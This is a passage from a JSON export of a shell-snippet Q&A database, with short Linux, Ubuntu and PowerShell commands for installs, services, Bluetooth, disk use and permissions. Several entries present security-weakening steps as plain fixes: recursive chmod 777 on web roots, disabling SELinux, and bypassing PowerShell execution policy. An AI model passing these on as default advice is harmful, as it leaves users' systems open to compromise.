    "description": "sudo -s sudo sh -c \"echo 'deb https://download.opensuse.org/repositories/home:/jkt-gentoo:/trojita/xUbuntu_16.04/ /' > /etc/apt/sources.list.d/trojita.list\" wget https://download.opensuse.org/repositories/home:jkt-gentoo:trojita/xUbuntu_16.04/Release.key sudo apt-key add - < Release.key sudo apt update sudo apt upgrade -y sudo apt install trojita \n",
    "reg_date": "2021-10-11T22:12:19.000Z"
  },
  {
    "id": 4541,
    "keyword": null,
    "link": null,
    "title": " truffle.ps1 is not digitally signed",
    "description": " Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:12:20.000Z"
  },
  {
    "id": 4542,
    "keyword": null,
    "link": null,
    "title": " ts3 install script",
    "description": "#!/bin/bash  ######################################### # Teamspeak 3 Server Installer # Version 3.12.1 # last Update 19.02.2020 # by SIGNALTRANSMITTER.de #########################################  c=`tput setaf 6` w=`tput setaf 7` r=`tput setaf 1` y=`tput setaf 3`  ### DIESE VARIABLEN KOENNEN GEAENDERT WERDEN #TEAMSPEAK USERNAME user=\"teamspeak\"  #INSTALLATIONS-PFAD installdir=\"/home/$user/ts/\"  #TEAMSPEAK VERSION version=\"3.12.1\"  ############################################  x64=\"https://files.teamspeak-services.com/releases/server/$version/teamspeak3-server_linux_amd64-$version.tar.bz2\" x86=\"https://files.teamspeak-services.com/releases/server/$version/teamspeak3-server_linux_x86-$version.tar.bz2\"  echo \"Dieses Script installiert Teamspeak Server in der Version $r[$version]$w vollkommen automatisch. Die Funktion wird nicht garantiert! $w\" echo \"$y[ ACHTUNG ] Um die Version anzupassen, bitte die Variablen im Script editieren!\"  if [ -e /etc/locale.gen ]; then     echo \"$c[ INFO ]$w Locales werden installiert\"     sed -i \"s/^# de_DE/de_DE/\" /etc/locale.gen >/dev/null     grep -v \"^#\" /etc/locale.gen >/dev/null     /usr/sbin/locale-gen >/dev/null     update-locale LANG=de_DE.UTF-8 >/dev/null else     echo \"$c[ INFO ]$w Fehler beim konfigurieren von locales\" fi  if [ $(dpkg-query -W -f='${Status}' bzip2 2>/dev/null | grep -c \"ok installed\") -eq 0 ]; then     echo \"$c[ INFO ]$w Installiere Abh&auml;ngigkeit bzip2\"     apt-get update;     apt-get install -y bzip2; fi  if [ $(dpkg-query -W -f='${Status}' ca-certificates 2>/dev/null | grep -c \"ok installed\") -eq 0 ]; then     echo \"$c[ INFO ]$w Installiere Abh&auml;ngigkeit ca-certificates\"     apt-get update;     apt-get install -y ca-certificates; fi  ts3u=`cut -d: -f1 /etc/passwd | grep teamspeak`  if [ \"$ts3\" = \"teamspeak\" ]; then     echo \"$c[ INFO ]$w Der User $ts3u existiert schon. Bitte den User im Script anpassen.\"     exit else     echo \"$c[ INFO ]$w Erstelle Teamspeak-User...\"     useradd $user fi  echo \"$c[ INFO ]$w Die Installation beginnt automatisch in 5 Sekunden...\" sleep 5  if [ -d \"$installdir\" ]; then     echo \"$r[ ERROR ]$w Das Verzeichnis $installdir existiert bereits. Breche ab!\"     exit else     echo \"$c[ INFO ]$w Das Verzeichnis $installdir existiert nicht. $installdir wird erstellt...\"     mkdir -p $installdir fi  cd $installdir  if [ $(uname -m) == 'x86_64' ]; then     #64bit     wget -q $x64     tar xfj teamspeak3-server_linux_amd64*     echo \"$c[ INFO ]$w Entferne gepacktes Archiv...\"     cd \"teamspeak3-server_linux_amd64\"     mv * .. && cd .. && rm -rf teamspeak3-server_linux_amd64* && cd .. && chown -R $user:$user $installdir     echo \"$c[ INFO ]$w Der Teamspeak Server wird erstmalig gestartet...\"     cd $installdir     touch .ts3server_license_accepted     su -c \"./ts3server_minimal_runscript.sh > ADMIN &\" -s /bin/bash $user     sleep 5 && ps aufwx | grep teamspeak | grep -v grep | awk '{print $2}'     echo \"$c[ INFO ]$w Bitte den Token sowie Serveradmin-Login gut hinterlegen...\" else     #32bit     wget -q $x86     tar xfj teamspeak3-server_linux_x86*     echo \"$c[ INFO ]$w Entferne gepacktes Archiv...\"     cd \"teamspeak3-server_linux_x86\"     mv * .. && cd .. && rm -rf teamspeak3-server_linux_amd64* && cd .. && chown -R $user:$user $installdir     echo \"$c[ INFO ]$w Der Teamspeak Server wird erstmalig gestartet...\"     touch .ts3server_license_accepted     cd $installdir     su -c \"./ts3server_minimal_runscript.sh > ADMIN &\" -s /bin/bash $user     sleep 5 && ps aufwx | grep teamspeak | grep -v grep | awk '{print $2}'     echo \"$c[ INFO ]$w Bitte den Token sowie den Serveradmin-Login gut hinterlegen...\" fi  echo \"$c[ INFO ]$w Soll Teamspeak in den Autostart installiert werden? [y/n]\" read -n1 -p \"\" autostart case $autostart in   y|Y)      echo -e \"\\n$c[ INFO ]$w Der Startparameter wurde im Autostart hinterlegt.\"      echo \"su -c '$installdir/ts3server_startscript.sh start' -s /bin/bash $user\" | tee --append /etc/rc.local > /dev/null     ;;     *)      echo -e \"\\n$c[ INFO ]$w Der Startparameter wird$y nicht$w in den Autostart geschrieben.\"     ;; esac echo \"$c[ INFO ]$w Der Teamspeak Server wird nun automatisch gestartet...\" \n",
    "reg_date": "2021-10-11T22:12:20.000Z"
  },
  {
    "id": 4543,
    "keyword": null,
    "link": null,
    "title": " tsc init",
    "description": "tsc --init npx tsc --init\n$ tsc --init\nnpx -p typescript tsc --init \n",
    "reg_date": "2021-10-11T22:12:20.000Z"
  },
  {
    "id": 4544,
    "keyword": null,
    "link": null,
    "title": " ttys003 on mac bash",
    "description": "sudo scutil --set ComputerName \"newname\" sudo scutil --set LocalHostName \"newname\" sudo scutil --set HostName \"newname\" \n",
    "reg_date": "2021-10-11T22:12:20.000Z"
  },
  {
    "id": 4545,
    "keyword": null,
    "link": null,
    "title": " turn of raspberry",
    "description": "# in raspberry shell type: sudo shutdown now\n",
    "reg_date": "2021-10-11T22:12:20.000Z"
  },
  {
    "id": 4546,
    "keyword": null,
    "link": null,
    "title": " turn off bluetooth by default ubuntu 20\\.04",
    "description": "sudo systemctl disable bluetooth.service\n",
    "reg_date": "2021-10-11T22:12:20.000Z"
  },
  {
    "id": 4547,
    "keyword": null,
    "link": null,
    "title": " turn off bluetooth on startup ubuntu",
    "description": "sudo systemctl disable bluetooth.service\n",
    "reg_date": "2021-10-11T22:12:21.000Z"
  },
  {
    "id": 4548,
    "keyword": null,
    "link": null,
    "title": " turn off selinux centos",
    "description": "//This disables selinux this boot $ setenforce 0  //To entirely disable selinux $ sudo vi /etc/sysconfig/selinux  //Change the SELINUX=enforcing directive to SELINUX=disabled.  //Then reboot\n",
    "reg_date": "2021-10-11T22:12:21.000Z"
  },
  {
    "id": 4549,
    "keyword": null,
    "link": null,
    "title": " turn on bluetooth terminal linux",
    "description": "rfkill unblock bluetooth \nrfkill block bluetooth \n",
    "reg_date": "2021-10-11T22:12:21.000Z"
  },
  {
    "id": 4550,
    "keyword": null,
    "link": null,
    "title": " turn on bluetooth ubuntu terminal",
    "description": "sudo service bluetooth restart\nrfkill unblock bluetooth \nsudo rfkill block bluetooth : To stop bluetooh  sudo rfkill unblock bluetooth : To start bluetooh\nrfkill block bluetooth \n",
    "reg_date": "2021-10-11T22:12:21.000Z"
  },
  {
    "id": 4551,
    "keyword": null,
    "link": null,
    "title": " twig install",
    "description": "composer require \"twig/twig:^3.0\" \n",
    "reg_date": "2021-10-11T22:12:21.000Z"
  },
  {
    "id": 4552,
    "keyword": null,
    "link": null,
    "title": " ubuntn nginx restart",
    "description": "sudo service nginx restart\n",
    "reg_date": "2021-10-11T22:12:21.000Z"
  },
  {
    "id": 4553,
    "keyword": null,
    "link": null,
    "title": " ubuntu 14 apache2 graceful restart",
    "description": "# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop  # Reload Apache 2 server on Linux/Unix \"No downtime!\" sudo service apache2 reload\n# Start Apache 2 server on Linux/Unix sudo service apache2 start\n# how to stop a web server linux sudo service apache2 stop\n",
    "reg_date": "2021-10-11T22:12:21.000Z"
  },
  {
    "id": 4554,
    "keyword": null,
    "link": null,
    "title": " ubuntu 16.04 bluetooth not detecting devices",
    "description": "bluetoothctl\n",
    "reg_date": "2021-10-11T22:12:22.000Z"
  },
  {
    "id": 4555,
    "keyword": null,
    "link": null,
    "title": " ubuntu 18 ffmpeg install",
    "description": "sudo apt install software-properties-common sudo apt update sudo add-apt-repository ppa:jonathonf/ffmpeg-4 sudo apt install ffmpeg ffmpeg -version\n# On Ubuntu 18.04  $ sudo add-apt-repository ppa:jonathonf/ffmpeg-4 $ sudo apt install ffmpeg  # check version $ ffmpeg --version  # You can download Windows builds from ffmpeg site.\n",
    "reg_date": "2021-10-11T22:12:22.000Z"
  },
  {
    "id": 4556,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20.04 bluetooth not turning on or working",
    "description": "#turn bluetooth on: sudo /etc/init.d/bluetooth start  # make it automatic on boot sudo systemctl enable bluetooth\n",
    "reg_date": "2021-10-11T22:12:22.000Z"
  },
  {
    "id": 4557,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20.04 install skype",
    "description": "# If you have not installed snap sudo apt install snapd  sudo snap install skype --classic\n",
    "reg_date": "2021-10-11T22:12:22.000Z"
  },
  {
    "id": 4558,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20.04 install telegram",
    "description": "sudo apt install telegram-desktop\n",
    "reg_date": "2021-10-11T22:12:22.000Z"
  },
  {
    "id": 4559,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20.04 install yarn",
    "description": "sudo apt update sudo apt install yarn\n#Yarn versions prior to 2.0. Install via npm (recommended). #may require sudo npm install --global yarn #Yarn 2 and later may require sudo npm install -g yarn #Check installation yarn --version\nHow to Install Yarn on Ubuntu 20.04 | Linuxize sudo apt update sudo apt install yarn\n",
    "reg_date": "2021-10-11T22:12:23.000Z"
  },
  {
    "id": 4560,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20.04 is not in the sudoers file. This incident will be reported.",
    "description": "Remember to reboot the virtual machine after giving yourself sudo righs\nusermod -a -G sudo user or usermod -a -G wheel user  \n",
    "reg_date": "2021-10-11T22:12:23.000Z"
  },
  {
    "id": 4561,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20.04 openvpn client",
    "description": "sudo apt update sudo apt install openvpn -y ## Create a file called client.ovpn and copy VPN config to the file  sudo openvpn --config client.ovpn --daemon ip a show tun0\nsudo apt install network-manager-openvpn -y  https://www.youtube.com/watch?v=KcxKWudhkpc&ab_channel=LinusTechTips\n",
    "reg_date": "2021-10-11T22:12:23.000Z"
  },
  {
    "id": 4562,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20.04 pip2 install",
    "description": "sudo apt update sudo apt install curl sudo add-apt-repository universe sudo apt update sudo curl https://bootstrap.pypa.io/2.7/get-pip.py --output get-pip.py # Fetch get-pip.py for python 2.7  sudo python2 get-pip.py pip --version \n",
    "reg_date": "2021-10-11T22:12:23.000Z"
  },
  {
    "id": 4563,
    "keyword": null,
    "link": null,
    "title": " ubuntu 20 change display resolution",
    "description": "sudo xrandr --addmode eDP-1 \"1600x900_60.00\"\n",
    "reg_date": "2021-10-11T22:12:23.000Z"
  },
  {
    "id": 4564,
    "keyword": null,
    "link": null,
    "title": " ubuntu add permission to folder",
    "description": "sudo chmod -R 777 /var/DirectoryName\nsudo chmod -R a+rwx /path/to/folder\nsudo chmod -R 777 DirectoryName\nsudo chmod u+w myfolder \n",
    "reg_date": "2021-10-11T22:12:23.000Z"
  },
  {
    "id": 4565,
    "keyword": null,
    "link": null,
    "title": " ubuntu add user to group",
    "description": "sudo usermod -a -G group username\nusermod -a -G examplegroup exampleusername\n# add user to additional group  usermod -G groupname username\n",
    "reg_date": "2021-10-11T22:12:23.000Z"
  },
  {
    "id": 4566,
    "keyword": null,
    "link": null,
    "title": " ubuntu adduser",
    "description": "sudo adduser USERNAME # choose password # other fields can be left empty sudo usermod -aG sudo USERNAME  # change user to check if everything is ok su - USERNAME whoami #  output > USERNAME sudo whoami # output > root or an error  # if error switch back to the other account # and do the following to modify /etc/sudoers  sudo visudo # find a line like \"root ALL=(ALL:ALL) ALL\" (or similar) # add an identical line for USERNAME, like # \"USERNAME ALL=(ALL:ALL) ALL\" Ctrl+O, Ctrl+X  # save and exit # change user to check if everything is ok\n# add a user and set a password adduser USERNAME  # add user to sudoers / sudo groupe with command below usermod -aG sudo USERNAME \nsudo adduser username sudo usermod -aG sudo username\nsudo adduser userNameHere\n",
    "reg_date": "2021-10-11T22:12:24.000Z"
  },
  {
    "id": 4567,
    "keyword": null,
    "link": null,
    "title": " ubuntu apache2 command",
    "description": "# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop  # Reload Apache 2 server on Linux/Unix \"No downtime!\" sudo service apache2 reload\nsudo systemctl start apache2 sudo systemctl stop apache2 sudo systemctl restart apache2 sudo systemctl status apache2\nServerName gci.example.com \n",
    "reg_date": "2021-10-11T22:12:24.000Z"
  },
  {
    "id": 4568,
    "keyword": null,
    "link": null,
    "title": " ubuntu apache status",
    "description": "sudo systemctl status apache2\t\nsudo systemctl status apache2\n",
    "reg_date": "2021-10-11T22:12:24.000Z"
  },
  {
    "id": 4569,
    "keyword": null,
    "link": null,
    "title": " ubuntu apt-get update without input",
    "description": "sudo apt-get update && sudo apt-get -y upgrade \n",
    "reg_date": "2021-10-11T22:12:24.000Z"
  },
  {
    "id": 4570,
    "keyword": null,
    "link": null,
    "title": " ubuntu apt uninstall",
    "description": "sudo apt-get remove <application_name> \nsudo apt-get remove pkg\nsudo apt-get remove [pkg]\n",
    "reg_date": "2021-10-11T22:12:24.000Z"
  },
  {
    "id": 4571,
    "keyword": null,
    "link": null,
    "title": " ubuntu auditd show process activity by rules",
    "description": "# We can look at information on all system calls as an example: sudo aureport -s\n",
    "reg_date": "2021-10-11T22:12:24.000Z"
  },
  {
    "id": 4572,
    "keyword": null,
    "link": null,
    "title": " ubuntu bionic update security has sum mismatch",
    "description": "sudo rm -rf /var/lib/apt/lists/partial sudo apt-get update -o Acquire::CompressionTypes::Order::=gz\n",
    "reg_date": "2021-10-11T22:12:24.000Z"
  },
  {
    "id": 4573,
    "keyword": null,
    "link": null,
    "title": " ubuntu bluetooth not listed",
    "description": "bluetoothctl scan on\n",
    "reg_date": "2021-10-11T22:12:25.000Z"
  },
  {
    "id": 4574,
    "keyword": null,
    "link": null,
    "title": " ubuntu bluetooth not turning on",
    "description": "sudo rfkill unblock bluetooth \n#!/bin/sh # sudo nano /lib/systemd/system-sleep/bt # Paste in this script:  case $1 in   post)     modprobe -r btusb     sleep 1     service bluetooth restart     sleep 1     modprobe btusb     ;; esac  # An finally make it executable chmod +x /lib/systemd/system-sleep/bt\n",
    "reg_date": "2021-10-11T22:12:25.000Z"
  },
  {
    "id": 4575,
    "keyword": null,
    "link": null,
    "title": " ubuntu bluetooth not working",
    "description": "sudo service bluetooth restart \n#turn bluetooth on: sudo /etc/init.d/bluetooth restart  # make it automatic on boot sudo systemctl enable bluetooth\nsudo rfkill unblock bluetooth \nbluetoothctl scan on\n",
    "reg_date": "2021-10-11T22:12:25.000Z"
  },
  {
    "id": 4576,
    "keyword": null,
    "link": null,
    "title": " ubuntu boot slow",
    "description": "# find out which process is holding you back systemd-analyze blame\n",
    "reg_date": "2021-10-11T22:12:25.000Z"
  },
  {
    "id": 4577,
    "keyword": null,
    "link": null,
    "title": " ubuntu cat release",
    "description": "cat /etc/os-release\n",
    "reg_date": "2021-10-11T22:12:26.000Z"
  },
  {
    "id": 4578,
    "keyword": null,
    "link": null,
    "title": " ubuntu certbot nginx",
    "description": "sudo add-apt-repository ppa:certbot/certbot sudo apt install python-certbot-nginx sudo certbot --nginx -d example.com -d www.example.com\n// Ubuntu 20.04 sudo apt install certbot python3-certbot-nginx  // Ubuntu 18.04 sudo add-apt-repository ppa:certbot/certbot sudo apt install python-certbot-nginx  // Configure ufw sudo ufw allow 'Nginx Full' sudo ufw delete allow 'Nginx HTTP' sudo ufw delete allow 'Nginx HTTPS'  sudo certbot --nginx -d example.com\n#Once you have installed CertBot and Lets Encyrypt,  #and you have set up your server blocks,  #you will be able to run the below script in your terminal sudo certbot --nginx -d example.com -d www.example.com\nsudo certbot renew sudo service nginx restart\n",
    "reg_date": "2021-10-11T22:12:26.000Z"
  },
  {
    "id": 4579,
    "keyword": null,
    "link": null,
    "title": " ubuntu change permissions 777",
    "description": "sudo chmod -R 777 /var/www \n",
    "reg_date": "2021-10-11T22:12:26.000Z"
  },
  {
    "id": 4580,
    "keyword": null,
    "link": null,
    "title": " ubuntu change permissions on folder and subfolders",
    "description": "# To change all the directories to 755 (drwxr-xr-x): find /opt/lampp/htdocs -type d -exec chmod 755 {} \\;  # To change all the files to 644 (-rw-r--r--): find /opt/lampp/htdocs -type f -exec chmod 644 {} \\;\nsudo chmod -R a+rwx /path/to/folder\n",
    "reg_date": "2021-10-11T22:12:26.000Z"
  },
  {
    "id": 4581,
    "keyword": null,
    "link": null,
    "title": " ubuntu check file last modified",
    "description": "stat myfilename.txt | grep \"Modify\"\nstat file_name\n",
    "reg_date": "2021-10-11T22:12:26.000Z"
  },
  {
    "id": 4582,
    "keyword": null,
    "link": null,
    "title": " ubuntu check graphics card info",
    "description": "lspci | grep VGA  sudo lshw -C video  sudo lshw -C video | grep product:\n",
    "reg_date": "2021-10-11T22:12:27.000Z"
  },
  {
    "id": 4583,
    "keyword": null,
    "link": null,
    "title": " ubuntu check how many cores",
    "description": "cat /proc/cpuinfo | grep processor | wc -l \n",
    "reg_date": "2021-10-11T22:12:27.000Z"
  },
  {
    "id": 4584,
    "keyword": null,
    "link": null,
    "title": " ubuntu check process on port",
    "description": "sudo lsof -i:22\nsudo lsof -i:8080\nlsof -i -P -n\n",
    "reg_date": "2021-10-11T22:12:27.000Z"
  },
  {
    "id": 4585,
    "keyword": null,
    "link": null,
    "title": " ubuntu check public ip command line",
    "description": "#4 Ways to Find Server Public IP Address in Linux Terminal #1. Using dig Utility dig +short myip.opendns.com @resolver1.opendns.com #2. Using host Utility host myip.opendns.com resolver1.opendns.com | grep \"myip.opendns.com has\" | awk '{print $4}' #3. Using wget Command Line Downloader wget -qO- http://ipecho.net/plain | xargs echo wget -qO - icanhazip.com #4. Using cURL Command Line Downloader  curl ifconfig.co  curl ifconfig.me  curl icanhazip.com  \n",
    "reg_date": "2021-10-11T22:12:27.000Z"
  },
  {
    "id": 4586,
    "keyword": null,
    "link": null,
    "title": " ubuntu check ssh login log",
    "description": "grep 'sshd' /var/log/auth.log\n",
    "reg_date": "2021-10-11T22:12:27.000Z"
  },
  {
    "id": 4587,
    "keyword": null,
    "link": null,
    "title": " ubuntu clean up disk space",
    "description": "#Quick clean up sudo apt-get autoremove sudo du -sh /var/cache/apt #clean apt cache sudo apt-get autoclean sudo apt-get clean journalctl --disk-usage du -h /var/lib/snapd/snaps #remove old versions of snap rm -rf ~/.cache/thumbnails/* #clean thumbnail cache  #Detailed iformation https://itsfoss.com/free-up-space-ubuntu-linux/\ndf -h \nsudo apt install ncdu ncdu\n",
    "reg_date": "2021-10-11T22:12:27.000Z"
  },
  {
    "id": 4588,
    "keyword": null,
    "link": null,
    "title": " ubuntu cleanup systemd journal",
    "description": "$ journalctl --vacuum-time=10d ... Vacuuming done, freed 2.3G of archived journals on disk.\n",
    "reg_date": "2021-10-11T22:12:28.000Z"
  },
  {
    "id": 4589,
    "keyword": null,
    "link": null,
    "title": " ubuntu clear dns cache",
    "description": "sudo systemd-resolve --flush-caches\nsudo systemctl restart nscd\n",
    "reg_date": "2021-10-11T22:12:28.000Z"
  },
  {
    "id": 4590,
    "keyword": null,
    "link": null,
    "title": " ubuntu click problem after computer standby",
    "description": "#Disable/Enable via Xinput: #Find your trackpad ID with the following command: xinput --list  #Once you have your device ID&mdash;I'll call it 12 for this example&mdash;try disabling and enabling the device with: xinput --disable 12 xinput --enable 12\n",
    "reg_date": "2021-10-11T22:12:28.000Z"
  },
  {
    "id": 4591,
    "keyword": null,
    "link": null,
    "title": " ubuntu cmd change user of a file",
    "description": "sudo chown -R username:group directory \n",
    "reg_date": "2021-10-11T22:12:28.000Z"
  },
  {
    "id": 4592,
    "keyword": null,
    "link": null,
    "title": " ubuntu color picker",
    "description": "# Color Picker for Ubuntu/Debiane sudo apt-get install gpick\n",
    "reg_date": "2021-10-11T22:12:28.000Z"
  },
  {
    "id": 4593,
    "keyword": null,
    "link": null,
    "title": " ubuntu command line replace word in files",
    "description": "sed -i 's/original/new/g' file.txt \nsed -i 's/foo/bar/g' hello.txt\n",
    "reg_date": "2021-10-11T22:12:28.000Z"
  },
  {
    "id": 4594,
    "keyword": null,
    "link": null,
    "title": " ubuntu command ram info",
    "description": "#to see the total amount of physical RAM installed: sudo lshw -c memory\n$ free -m\nfree -h  #              total        used        free      shared  buff/cache   available #Mem:      -->  7.7G  <--   6.2G        157M        503M        1.3G        709M #Swap:          2.0G        118M        1.9G  \nsudo dmidecode | grep -A 15 Memory\n",
    "reg_date": "2021-10-11T22:12:28.000Z"
  },
  {
    "id": 4595,
    "keyword": null,
    "link": null,
    "title": " ubuntu command to list largest files",
    "description": "du -a /dir/ | sort -n -r | head -n 20 # where /dir/ is the directory name\n",
    "reg_date": "2021-10-11T22:12:28.000Z"
  },
  {
    "id": 4596,
    "keyword": null,
    "link": null,
    "title": " ubuntu console shrink pdf",
    "description": "gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -dQUIET -dBATCH -sOutputFile=output.pdf input.pdf\nps2pdf large.pdf small.pdf\n",
    "reg_date": "2021-10-11T22:12:28.000Z"
  },
  {
    "id": 4597,
    "keyword": null,
    "link": null,
    "title": " ubuntu control brightness",
    "description": "xrandr | grep \" connected\" | cut -f1 -d \" \"  xrandr --output LVDS1 --brightness 0.7\n",
    "reg_date": "2021-10-11T22:12:29.000Z"
  },
  {
    "id": 4598,
    "keyword": null,
    "link": null,
    "title": " ubuntu create archive split",
    "description": "# First zip the file without compression zip -0 big_file.zip big_file.iso  # Then split the zip zip -s 1000m split_file big_file.zip  # To extract files pass unzip the first of the multizipped files  # and it automatically processes all of the children unzip split_file.zip\n",
    "reg_date": "2021-10-11T22:12:29.000Z"
  },
  {
    "id": 4599,
    "keyword": null,
    "link": null,
    "title": " ubuntu delete all files with extension",
    "description": "cd <dir> find . -type f -iname \\*.jpg -delete \n",
    "reg_date": "2021-10-11T22:12:29.000Z"
  },
  {
    "id": 4600,
    "keyword": null,
    "link": null,
    "title": " ubuntu delete directory and all files",
    "description": "rm -rf ./test\nrm -rf /path/to/directory \n$ rm -r directoryName\n# for removing empty directory $ rmdir myDirectory  # to remove a directory that contains files and subdirectory $ rm -r myDirectory rm -rf /config/filegroups/*/  \nrm -rf /config/filegroups/*/\nTo remove all non-hidden files and sub-directories (along with all of their contents) in a  directory use: rm -r /path/to/directory/*\n",
    "reg_date": "2021-10-11T22:12:29.000Z"
  },
  {
    "id": 4601,
    "keyword": null,
    "link": null,
    "title": " ubuntu delete from ssh known hosts",
    "description": "ssh-keygen -R hostname \n",
    "reg_date": "2021-10-11T22:12:29.000Z"
  },
  {
    "id": 4602,
    "keyword": null,
    "link": null,
    "title": " ubuntu dock not showing",
    "description": "This issue might be caused by issues during the upgrade. Try reinstalling Ubuntu dock:  sudo apt purge gnome-shell-extension-ubuntu-dock sudo apt install --reinstall ubuntu-desktop This may or may not repair things that apparently went wrong during the upgrade.\n",
    "reg_date": "2021-10-11T22:12:29.000Z"
  },
  {
    "id": 4603,
    "keyword": null,
    "link": null,
    "title": " ubuntu docker-compose cannot exit",
    "description": "Ctrl-p Ctrl-q  Or on Ubuntu 18.04 Ctrl+z\n",
    "reg_date": "2021-10-11T22:12:29.000Z"
  },
  {
    "id": 4604,
    "keyword": null,
    "link": null,
    "title": " ubuntu download yasm",
    "description": "Step 1 sudo apt-get update -y  Step 2 sudo apt-get install -y yasm\n",
    "reg_date": "2021-10-11T22:12:29.000Z"
  },
  {
    "id": 4605,
    "keyword": null,
    "link": null,
    "title": " ubuntu du sort by dir size",
    "description": "du -Sh /path/to/dir | sort -rh | head -20\n",
    "reg_date": "2021-10-11T22:12:30.000Z"
  },
  {
    "id": 4606,
    "keyword": null,
    "link": null,
    "title": " ubuntu exec how to exit",
    "description": "exec false\n",
    "reg_date": "2021-10-11T22:12:30.000Z"
  },
  {
    "id": 4607,
    "keyword": null,
    "link": null,
    "title": " ubuntu extract rar",
    "description": "# install unrar sudo apt-get install unrar  # extract the file unrar e filename.rar\n sudo apt-get install unrar. Or. $ sudo apt install unrar. ... unrar e filename.rar\n// first download unrar sudo apt install unrar // after the unrar installed you can unrar your file with this command unrar e filename.rar // and the next command if you wont your file with the orginal directory unrar x filename.rar\nunrar x <file.rar>\n",
    "reg_date": "2021-10-11T22:12:30.000Z"
  },
  {
    "id": 4608,
    "keyword": null,
    "link": null,
    "title": " ubuntu extract rar file",
    "description": " sudo apt-get install unrar. Or. $ sudo apt install unrar. ... unrar e filename.rar\n// first download unrar sudo apt install unrar // after the unrar installed you can unrar your file with this command unrar e filename.rar // and the next command if you wont your file with the orginal directory unrar x filename.rar\n",
    "reg_date": "2021-10-11T22:12:30.000Z"
  },
  {
    "id": 4609,
    "keyword": null,
    "link": null,
    "title": " ubuntu find firefox profiler through terminal",
    "description": "cd ~/.mozilla/firefox  \n",
    "reg_date": "2021-10-11T22:12:30.000Z"
  },
  {
    "id": 4610,
    "keyword": null,
    "link": null,
    "title": " ubuntu find mozilla profiler through terminal",
    "description": "cd ~/.mozilla/firefox  \n",
    "reg_date": "2021-10-11T22:12:30.000Z"
  },
  {
    "id": 4611,
    "keyword": null,
    "link": null,
    "title": " ubuntu generate ssh key",
    "description": "ssh-keygen -t rsa -b 4096 ssh-keygen -t dsa ssh-keygen -t ecdsa -b 521 ssh-keygen -t ed25519\nssh-keygen -t rsa -C \"your_email@example.com\"\nssh-keygen -t rsa 4056\ncat ~/.ssh/id_rsa.pub | ssh username@remote_host \"mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys && chmod -R go= ~/.ssh && cat >> ~/.ssh/authorized_keys\" \nssh-copy-id -i ~/.ssh/id_rsa.pub user@server\n",
    "reg_date": "2021-10-11T22:12:30.000Z"
  },
  {
    "id": 4612,
    "keyword": null,
    "link": null,
    "title": " ubuntu generate ssl certificate",
    "description": "1. Go to https://certbot.eff.org/instructions 2. Select Servername(i.e. Apache/Nginx), Operating System (i.e. Ubuntu 18.04, CentOS) 3. That's it you have whole instructions for ssl configuration on your server\n",
    "reg_date": "2021-10-11T22:12:31.000Z"
  },
  {
    "id": 4613,
    "keyword": null,
    "link": null,
    "title": " ubuntu get folder size",
    "description": "du -hs /path/to/directory \ndu -sh /home/user/\n",
    "reg_date": "2021-10-11T22:12:31.000Z"
  },
  {
    "id": 4614,
    "keyword": null,
    "link": null,
    "title": " ubuntu get full path of file",
    "description": "$ readlink -e ./out.txt                                                                                                   /home/xieerqi/out.txt \n",
    "reg_date": "2021-10-11T22:12:31.000Z"
  },
  {
    "id": 4615,
    "keyword": null,
    "link": null,
    "title": " ubuntu get pid of process",
    "description": "#to search for pid ps ax | grep firefox #and to kill it run sudo kill -9 THE_PID_NUMBER\n",
    "reg_date": "2021-10-11T22:12:31.000Z"
  },
  {
    "id": 4616,
    "keyword": null,
    "link": null,
    "title": " ubuntu get process on port",
    "description": "sudo lsof -i:22\nsudo lsof -i:<port_number>\nlsof -i -P -n\n",
    "reg_date": "2021-10-11T22:12:31.000Z"
  },
  {
    "id": 4617,
    "keyword": null,
    "link": null,
    "title": " ubuntu get ram usage",
    "description": "$ free -m\nsudo dmidecode | grep -A 15 Memory\n",
    "reg_date": "2021-10-11T22:12:31.000Z"
  },
  {
    "id": 4618,
    "keyword": null,
    "link": null,
    "title": " ubuntu get your ip address from terminal\\",
    "description": "hostname -I | cut -d' ' -f1\nOpen your command prompt and type following command shown below and press enter  ifconfig -a\nfor local ip :  hostname -I  for Public ip :  curl icanhazip.com\n",
    "reg_date": "2021-10-11T22:12:31.000Z"
  },
  {
    "id": 4619,
    "keyword": null,
    "link": null,
    "title": " ubuntu git credentials cache",
    "description": "",
    "reg_date": "2021-10-11T22:12:31.000Z"
  },
  {
    "id": 4620,
    "keyword": null,
    "link": null,
    "title": " ubuntu gpg 2",
    "description": "sudo apt-get install gnupg2 -y Copy to clipboard\n",
    "reg_date": "2021-10-11T22:12:31.000Z"
  },
  {
    "id": 4621,
    "keyword": null,
    "link": null,
    "title": " ubuntu high resolution scaling layer",
    "description": "xrandr\n",
    "reg_date": "2021-10-11T22:12:32.000Z"
  },
  {
    "id": 4622,
    "keyword": null,
    "link": null,
    "title": " ubuntu higher displayer resolution",
